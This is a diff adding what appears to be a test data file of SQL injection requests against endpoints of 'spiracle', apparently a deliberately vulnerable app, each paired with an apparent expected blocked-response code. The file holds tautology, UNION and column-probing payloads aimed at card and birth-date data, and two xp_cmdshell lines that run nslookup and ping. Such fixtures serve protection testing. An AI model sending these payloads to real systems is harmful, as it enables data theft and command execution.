@@ -1,0 +1,301 @@
+/spiracle/Get_int<split>?id=2' OR name LIKE '%25<split>550
+/spiracle/Get_int<split>?id=1' or name like '%25<split>550
+/spiracle/Get_int<split>?id=1' or id like '%25<split>550
+/spiracle/Get_int<split>?id=' or name like '%25<split>550
+/spiracle/Get_int<split>?id=1' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+/spiracle/Get_int<split>?id=1' AND users.cvv IS NULL --<split>550
+/spiracle/Get_int<split>?id=1' AND DOB IS NULL --<split>550
+/spiracle/Get_int<split>?id=1' AND cvv IS NULL --<split>550
+/spiracle/Get_int<split>?id=1' OR 'x'='x'--<split>550
+/spiracle/Get_int<split>?id=1' or 1=1 or 'x'='y'--<split>550
+/spiracle/Get_int<split>?id=1' UNION ALL SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_int<split>?id=1' or 1=1 or ''=''--<split>550
+/spiracle/Get_int<split>?id=' or 1=1 or ''=''--<split>550
+/spiracle/Get_int<split>?id=("hi")' or ('a'='a')--<split>550
+/spiracle/Get_int<split>?id=a' or 'a' = 'a'--<split>550
+/spiracle/Get_int<split>?id=joe' or '1'='1'--<split>550
+/spiracle/Get_int<split>?id=1' UNION SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_int<split>?id=hi' or 1=1--<split>550
+/spiracle/Get_int<split>?id=hi' or 'a'='a'--<split>550
+/spiracle/Get_int<split>?id=a' or 1=1--<split>550
+/spiracle/Get_int<split>?id=%20or%20'x'='x'--<split>550
+/spiracle/Get_int<split>?id=' or 0=0 --<split>550
+/spiracle/Get_int<split>?id=a' or 3=3--<split>550
+/spiracle/Get_int<split>?id=Joe' or 0=0 --<split>550
+/spiracle/Get_int<split>?id=Joe' or 'a'='a'--<split>550
+/spiracle/Get_int<split>?id=1' or ''=''--<split>550
+/spiracle/Get_int<split>?id=' or 1=1--<split>550
+/spiracle/Get_int<split>?id='%20or%201=1--<split>550
+/spiracle/Get_int<split>?id=%27%20or%201=1--<split>550
+/spiracle/Get_int<split>?id=' or 3=3--<split>550
+/spiracle/Get_int_no_quote<split>?id=2 OR name LIKE '%25'<split>550
+/spiracle/Get_int_no_quote<split>?id=1 or name like '%25'<split>550
+/spiracle/Get_int_no_quote<split>?id=1 or id like '%25'<split>550
+/spiracle/Get_int_no_quote<split>?id=1 or name like '%25'<split>550
+/spiracle/Get_int_no_quote<split>?id=1 OR 120=(SELECT COUNT(*) FROM users) --<split>550
+/spiracle/Get_int_no_quote<split>?id=1 AND users.cvv IS NULL --<split>550
+/spiracle/Get_int_no_quote<split>?id=1 AND DOB IS NULL --<split>550
+/spiracle/Get_int_no_quote<split>?id=1 AND cvv IS NULL --<split>550
+/spiracle/Get_int_no_quote<split>?id=1 OR 'x'='x'<split>550
+/spiracle/Get_int_no_quote<split>?id=1 or 1=1 or 'x'='y'<split>550
+/spiracle/Get_int_no_quote<split>?id=1 UNION ALL SELECT * from users where id=1 or 1=1<split>550
+/spiracle/Get_int_no_quote<split>?id=1 or 1=1 or ''=''<split>550
+/spiracle/Get_int_no_quote<split>?id='' or 1=1 or ''=''<split>550
+/spiracle/Get_int_no_quote<split>?id=('hi') or ('a'='a')<split>550
+/spiracle/Get_int_no_quote<split>?id='a' or 'a' = 'a'<split>550
+/spiracle/Get_int_no_quote<split>?id=1 UNION SELECT * from users where id=1 or 1=1<split>550
+/spiracle/Get_int_no_quote<split>?id='joe' or '1'='1'--<split>550
+/spiracle/Get_int_no_quote<split>?id=(%27%27)%20or%20(%27x%27=%27x%27)<split>550
+/spiracle/Get_int_no_quote<split>?id=('') or ('a'='a')<split>550
+/spiracle/Get_int_no_quote<split>?id='hi' or 1=1--<split>550
+/spiracle/Get_int_no_quote<split>?id='hi' or 'a'='a'<split>550
+/spiracle/Get_int_no_quote<split>?id='a' or 1=1--<split>550
+/spiracle/Get_int_no_quote<split>?id=''%20or%20'x'='x'<split>550
+/spiracle/Get_int_no_quote<split>?id='' or 0=0 --<split>550
+/spiracle/Get_int_no_quote<split>?id='a' or 3=3--<split>550
+/spiracle/Get_int_no_quote<split>?id='Joe' or 0=0 #<split>550
+/spiracle/Get_int_no_quote<split>?id='Joe' or 'a'='a'<split>550
+/spiracle/Get_int_no_quote<split>?id=1%20or%20''=''<split>550
+/spiracle/Get_int_no_quote<split>?id=1 or ''=''<split>550
+/spiracle/Get_int_no_quote<split>?id='Joe' or 1=1<split>550
+/spiracle/Get_int_no_quote<split>?id='Joe' %20or%201=1<split>550
+/spiracle/Get_int_no_quote<split>?id='Joe %27%20or%201=1<split>550
+/spiracle/Get_int_no_quote<split>?id='Joe' or 3=3<split>550
+/spiracle/Get_int_partialunion<split>?id=2' OR name LIKE '%25<split>550
+/spiracle/Get_int_partialunion<split>?id=1' or name like '%25<split>550
+/spiracle/Get_int_partialunion<split>?id=1' or id like '%25<split>550
+/spiracle/Get_int_partialunion<split>?id=' or name like '%25<split>550
+/spiracle/Get_int_partialunion<split>?id=1' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+/spiracle/Get_int_partialunion<split>?id=1' AND users.cvv IS NULL --<split>550
+/spiracle/Get_int_partialunion<split>?id=1' AND DOB IS NULL --<split>550
+/spiracle/Get_int_partialunion<split>?id=1' AND cvv IS NULL --<split>550
+/spiracle/Get_int_partialunion<split>?id=1' OR 'x'='x'--<split>550
+/spiracle/Get_int_partialunion<split>?id=1' or 1=1 or 'x'='y'--<split>550
+/spiracle/Get_int_partialunion<split>?id=1' UNION ALL SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_int_partialunion<split>?id=1' or 1=1 or ''=''--<split>550
+/spiracle/Get_int_partialunion<split>?id=' or 1=1 or ''=''--<split>550
+/spiracle/Get_int_partialunion<split>?id=("hi")' or ('a'='a')--<split>550
+/spiracle/Get_int_partialunion<split>?id=a' or 'a' = 'a'--<split>550
+/spiracle/Get_int_partialunion<split>?id=joe' or '1'='1'--<split>550
+/spiracle/Get_int_partialunion<split>?id=1' UNION SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_int_partialunion<split>?id=hi' or 1=1--<split>550
+/spiracle/Get_int_partialunion<split>?id=hi' or 'a'='a'--<split>550
+/spiracle/Get_int_partialunion<split>?id=a' or 1=1--<split>550
+/spiracle/Get_int_partialunion<split>?id='%20or%20'x'='x'--<split>550
+/spiracle/Get_int_partialunion<split>?id=' or 0=0 --<split>550
+/spiracle/Get_int_partialunion<split>?id=a' or 3=3--<split>550
+/spiracle/Get_int_partialunion<split>?id=Joe' or 0=0 --<split>550
+/spiracle/Get_int_partialunion<split>?id=Joe' or 'a'='a'--<split>550
+/spiracle/Get_int_partialunion<split>?id=1' or ''=''--<split>550
+/spiracle/Get_int_partialunion<split>?id=' or 1=1--<split>550
+/spiracle/Get_int_partialunion<split>?id=' %20or%201=1--<split>550
+/spiracle/Get_int_partialunion<split>?id=%27%20or%201=1--<split>550
+/spiracle/Get_int_partialunion<split>?id=' or 3=3--<split>550
+/spiracle/Get_int_groupby<split>?id=name union all select null, to_char(dob) from users<split>550
+/spiracle/Get_int_groupby<split>?id=name union select null, to_char(dob) from users<split>550
+/spiracle/Get_int_nooutput<split>?id=2' OR name LIKE '%25<split>550
+/spiracle/Get_int_nooutput<split>?id=1' or name like '%25<split>550
+/spiracle/Get_int_nooutput<split>?id=1' or id like '%25<split>550
+/spiracle/Get_int_nooutput<split>?id=' or name like '%25<split>550
+/spiracle/Get_int_nooutput<split>?id=1' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+/spiracle/Get_int_nooutput<split>?id=1' AND users.cvv IS NULL --<split>550
+/spiracle/Get_int_nooutput<split>?id=1' AND DOB IS NULL --<split>550
+/spiracle/Get_int_nooutput<split>?id=1' AND cvv IS NULL --<split>550
+/spiracle/Get_int_nooutput<split>?id=1' OR 'x'='x'--<split>550
+/spiracle/Get_int_nooutput<split>?id=1' or 1=1 or 'x'='y'--<split>550
+/spiracle/Get_int_nooutput<split>?id=1' UNION ALL SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_int_nooutput<split>?id=1' or 1=1 or ''=''--<split>550
+/spiracle/Get_int_nooutput<split>?id=' or 1=1 or ''=''--<split>550
+/spiracle/Get_int_nooutput<split>?id=("hi")' or ('a'='a')--<split>550
+/spiracle/Get_int_nooutput<split>?id=a' or 'a' = 'a'--<split>550
+/spiracle/Get_int_nooutput<split>?id=joe' or '1'='1'--<split>550
+/spiracle/Get_int_nooutput<split>?id=1' UNION SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_int_nooutput<split>?id=hi' or 1=1--<split>550
+/spiracle/Get_int_nooutput<split>?id=hi' or 'a'='a'--<split>550
+/spiracle/Get_int_nooutput<split>?id=a' or 1=1--<split>550
+/spiracle/Get_int_nooutput<split>?id='%20or%20'x'='x'--<split>550
+/spiracle/Get_int_nooutput<split>?id=' or 0=0 --<split>550
+/spiracle/Get_int_nooutput<split>?id=a' or 3=3--<split>550
+/spiracle/Get_int_nooutput<split>?id=Joe' or 0=0 --<split>550
+/spiracle/Get_int_nooutput<split>?id=Joe' or 'a'='a'--<split>550
+/spiracle/Get_int_nooutput<split>?id=1' or ''=''--<split>550
+/spiracle/Get_int_nooutput<split>?id=' or 1=1--<split>550
+/spiracle/Get_int_nooutput<split>?id=1%27%20or%201=1--<split>550
+/spiracle/Get_int_nooutput<split>?id=' %20or%201=1--<split>550
+/spiracle/Get_int_nooutput<split>?id=' or 3=3--<split>550
+/spiracle/Get_int_having<split>?id=1 union select to_char(dob) from users<split>550
+/spiracle/Get_int_having<split>?id=1 union all select to_char(dob) from users<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = 'x' OR name LIKE 'Joe'<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = '' or name like ''<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where id = '' or id like ''<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = '' or name like ''<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name ='x' AND users.cvv IS NULL --<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = 'x' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name ='Joe' AND DOB IS NULL --<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name ='Joe' AND cvv IS NULL --<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name ='anything' OR 'x'='x'<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = 'x' or 1=1 or 'x'='y'<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name ='Joe' UNION ALL SELECT * from users where id=1 or 1=1<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = '' or 1=1 or ''=''<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = ('hi') or ('a'='a')<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = 'a' or 'a' = 'a'<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = 'joe' or '1'='1'--<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name ='Joe' UNION SELECT * from users where id=1 or 1=1<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name = (%27%27)%20or%20(%27x%27=%27x%27)<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name=('') or ('a'='a')<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='hi' or 1=1--<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='hi' or 'a'='a'<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='a' or 1=1--<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name=''%20or%20'x'='x'<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='' or 0=0 --<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='a' or 3=3--<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe' or 0=0 #<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe' or 'a'='a'<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe'%20or%20''=''<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe' or 1=1<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe' or ''=''<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe' %20or%201=1<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe %27%20or%201=1<split>550
+/spiracle/Get_int_inline<split>?id=select * from users where name='Joe' or 3=3<split>550
+/spiracle/Get_string<split>?name=x' or name like '%25'--<split>550
+/spiracle/Get_string<split>?name=t'exec master..xp_cmdshell 'nslookup%20www%2egoogle%2ecom'--<split>550
+/spiracle/Get_string<split>?name='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--<split>550
+/spiracle/Get_string<split>?name=x' AND 100=(SELECT COUNT(*) FROM address) --<split>550
+/spiracle/Get_string<split>?name=x' OR cvv IS NULL--<split>550
+/spiracle/Get_string<split>?name=anything' OR 'x'='x<split>550
+/spiracle/Get_string<split>?name=x' or 1=1 or 'x'='y<split>550
+/spiracle/Get_string<split>?name=' UNION ALL SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_string<split>?name='or 1=1 or ''='<split>550
+/spiracle/Get_string<split>?name=a' or 'a' = 'a<split>550
+/spiracle/Get_string<split>?name=' or '1'='1'--<split>550
+/spiracle/Get_string<split>?name=' UNION SELECT * from users--<split>550
+/spiracle/Get_string<split>?name=a' or 1=1--<split>550
+/spiracle/Get_string<split>?name=%27%20or%20%27x%27=%27x<split>550
+/spiracle/Get_string<split>?name='or 0=0 --<split>550
+/spiracle/Get_string<split>?name=a' or 3=3--<split>550
+/spiracle/Get_string<split>?name=' or 1=1--<split>550
+/spiracle/Get_string<split>?name=' or 1 --'<split>550
+/spiracle/Get_string<split>?name=' or 'a'='a'--<split>550
+/spiracle/Get_string<split>?name=%27%20or%201=1--<split>550
+/spiracle/Get_string<split>?name=x' or 3=3--<split>550
+/spiracle/Get_string_no_quote<split>?name='2' OR name LIKE 'Joe'<split>550
+/spiracle/Get_string_no_quote<split>?name='Jon' or name like 'Joe'<split>550
+/spiracle/Get_string_no_quote<split>?name='1' or id like '2'<split>550
+/spiracle/Get_string_no_quote<split>?name='1' or name like 'Joe'<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+/spiracle/Get_string_no_quote<split>?name='1' or name like 'Sammy'<split>550
+/spiracle/Get_string_no_quote<split>?name='1' AND users.cvv IS NULL --<split>550
+/spiracle/Get_string_no_quote<split>?name='1' AND DOB IS NULL --<split>550
+/spiracle/Get_string_no_quote<split>?name='1' AND cvv IS NULL --<split>550
+/spiracle/Get_string_no_quote<split>?name='1' OR 'x'='x'<split>550
+/spiracle/Get_string_no_quote<split>?name='1' or 1=1 or 'x'='y'--<split>550
+/spiracle/Get_string_no_quote<split>?name='1' UNION ALL SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_string_no_quote<split>?name='' or 1=1 or ''=''--<split>550
+/spiracle/Get_string_no_quote<split>?name='1' or 1=1 or ''=''--<split>550
+/spiracle/Get_string_no_quote<split>?name=(1) or ('a'='a')--<split>550
+/spiracle/Get_string_no_quote<split>?name=1 or 'a' = 'a'--<split>550
+/spiracle/Get_string_no_quote<split>?name=1 or '1'='1'--<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' UNION SELECT * from users where id=1 or 1=1--<split>550
+/spiracle/Get_string_no_quote<split>?name=('') or ('a'='a')--<split>550
+/spiracle/Get_string_no_quote<split>?name=('') or ('x'='x')--<split>550
+/spiracle/Get_string_no_quote<split>?name='' or 'a'='a'--<split>550
+/spiracle/Get_string_no_quote<split>?name='' or 1=1--<split>550
+/spiracle/Get_string_no_quote<split>?name='a' or 1=1--<split>550
+/spiracle/Get_string_no_quote<split>?name=%27%27%20or%20%27x%27%3D%27x%27--<split>550
+/spiracle/Get_string_no_quote<split>?name='a' or 3=3--<split>550
+/spiracle/Get_string_no_quote<split>?name='' or 0=0 --<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' or 0=0 #<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' or 'a'='a'--<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' or 'a'='a'<split>550
+/spiracle/Get_string_no_quote<split>?name='1' or ''=''--<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' %20or%201=1--<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' or 1=1--<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe %27%20or%201=1--<split>550
+/spiracle/Get_string_no_quote<split>?name='Joe' or 3=3--<split>550
+/spiracle/Get_Implicit_Join<split>?id='2' OR 'name' LIKE 'Joe'<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' or 'name' like 'Joe'<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' or users.id like 1<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' or 'users.name' like'Joe'<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' OR 120=(SELECT COUNT(*) FROM users)<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' AND 'users.cvv' IS NULL<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' AND 'DOB' IS NULL<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' AND 'cvv' IS NULL<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' OR 'x'='x'<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' or 1=1 or 'x'='y'<split>550
+/spiracle/Get_Implicit_Join<split>?id='1' or 1=1 or ''=''--<split>550
+/spiracle/Get_Implicit_Join<split>?id='' or 1=1 or ''=''--<split>550
+/spiracle/Get_Implicit_Join<split>?id=('hi') or ('a'='a')<split>550
+/spiracle/Get_Implicit_Join<split>?id='a' or 'a' = 'a'<split>550
+/spiracle/Get_Implicit_Join<split>?id='joe' or '1'='1'<split>550
+/spiracle/Get_Implicit_Join<split>?id='hi' or 1=1--<split>550
+/spiracle/Get_Implicit_Join<split>?id='hi' or 'a'='a'--<split>550
+/spiracle/Get_Implicit_Join<split>?id='a' or 1=1--<split>550
+/spiracle/Get_Implicit_Join<split>?id=''%20or%20'x'='x'--<split>550
+/spiracle/Get_Implicit_Join<split>?id='' or 0=0 --<split>550
+/spiracle/Get_Implicit_Join<split>?id='a' or 3=3--<split>550
+/spiracle/Get_Implicit_Join<split>?id='Joe' or 0=0 --<split>550
+/spiracle/Get_Implicit_Join<split>?id='Joe' or 'a'='a'--<split>550
+/spiracle/Get_Implicit_Join<split>?id=1 or 'a'='a'<split>550
+/spiracle/Get_Implicit_Join<split>?id=1 or '1'='1'<split>550
+/spiracle/Get_Implicit_Join<split>?id='' or 1=1--<split>550
+/spiracle/Get_Implicit_Join<split>?id='' %20or%201=1--<split>550
+/spiracle/Get_Implicit_Join<split>?id='' or 3=3--<split>550
+/spiracle/Get_Implicit_Join<split>?id=%27%27%20or%201=1--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='2' OR 'name' LIKE 'Joe'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' or 'name' like 'Joe'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' or users.id like 1<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' or 'users.name' like'Joe'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' OR 120=(SELECT COUNT(*) FROM users)<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' AND 'users.cvv' IS NULL<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' AND 'DOB' IS NULL<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' AND 'cvv' IS NULL<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' OR 'x'='x'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' or 1=1 or 'x'='y'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='1' or 1=1 or ''=''--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='' or 1=1 or ''=''--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id=('hi') or ('a'='a')<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='a' or 'a' = 'a'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='joe' or '1'='1'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='hi' or 'a'='a'--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='hi' or 1=1--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='a' or 1=1--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='' or 0=0 --<split>550
+/spiracle/Get_Full_Outer_Join<split>?id=''%20or%20'x'='x'--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='a' or 3=3--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='Joe' or 0=0 --<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='Joe' or 'a'='a'--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id=1 or 'a'='a'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id=1 or '1'='1'<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='' or 1=1--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='' %20or%201=1--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id=%27%27%20or%201=1--<split>550
+/spiracle/Get_Full_Outer_Join<split>?id='' or 3=3--<split>550
+/spiracle/Get_Union<split>?id='2' OR 'name' LIKE 'Joe'<split>550
+/spiracle/Get_Union<split>?id='1' or 'name' like 'Joe'<split>550
+/spiracle/Get_Union<split>?id='1' or id like 1<split>550
+/spiracle/Get_Union<split>?id='1' or 'name' like'Joe'<split>550
+/spiracle/Get_Union<split>?id='1' OR 120=(SELECT COUNT(*) FROM users)<split>550
+/spiracle/Get_Union<split>?id='1' AND 'users.cvv' IS NULL<split>550
+/spiracle/Get_Union<split>?id='1' AND 'DOB' IS NULL<split>550
+/spiracle/Get_Union<split>?id='1' AND 'cvv' IS NULL<split>550
+/spiracle/Get_Union<split>?id='1' OR 'x'='x'<split>550
+/spiracle/Get_Union<split>?id='1' or 1=1 or 'x'='y'<split>550
+/spiracle/Get_Union<split>?id='1' or 1=1 or ''=''--<split>550
+/spiracle/Get_Union<split>?id=' or 1=1 or ''=''--<split>550
+/spiracle/Get_Union<split>?id='("hi")' or ('a'='a')--<split>550
+/spiracle/Get_Union<split>?id='a' or 'a' = 'a'<split>550
+/spiracle/Get_Union<split>?id='joe' or '1'='1'<split>550
+/spiracle/Get_Union<split>?id='hi' or 1=1--<split>550
+/spiracle/Get_Union<split>?id='hi' or 'a'='a'--<split>550
+/spiracle/Get_Union<split>?id='a' or 1=1--<split>550
+/spiracle/Get_Union<split>?id=''%20or%20'x'='x'--<split>550
+/spiracle/Get_Union<split>?id='' or 0=0 --<split>550
+/spiracle/Get_Union<split>?id='a' or 3=3--<split>550
+/spiracle/Get_Union<split>?id='Joe' or 0=0 --<split>550
+/spiracle/Get_Union<split>?id='Joe' or 'a'='a'--<split>550
+/spiracle/Get_Union<split>?id=1 or 'a'='a'<split>550
+/spiracle/Get_Union<split>?id=1 or '1'='1'<split>550
+/spiracle/Get_Union<split>?id=' or 1=1--<split>550
+/spiracle/Get_Union<split>?id=%27%20or%201=1--<split>550
+/spiracle/Get_Union<split>?id=' %20or%201=1--<split>550
+/spiracle/Get_Union<split>?id=' or 3=3--<split>550
